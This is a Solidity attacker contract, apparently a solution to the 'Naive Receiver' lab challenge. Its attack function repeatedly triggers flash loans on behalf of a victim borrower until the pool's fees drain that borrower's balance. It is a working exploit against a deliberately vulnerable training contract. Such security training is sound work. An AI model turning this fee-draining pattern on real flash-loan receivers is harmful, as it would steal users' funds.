// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    NaiveReceiverLenderPool pool;

    constructor(NaiveReceiverLenderPool _pool) {
        pool = _pool;
    }

    function attack(address _target) external {
        while (_target.balance > 0) {
            pool.flashLoan(IERC3156FlashBorrower(_target), 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 1, "");
        }
    }
}
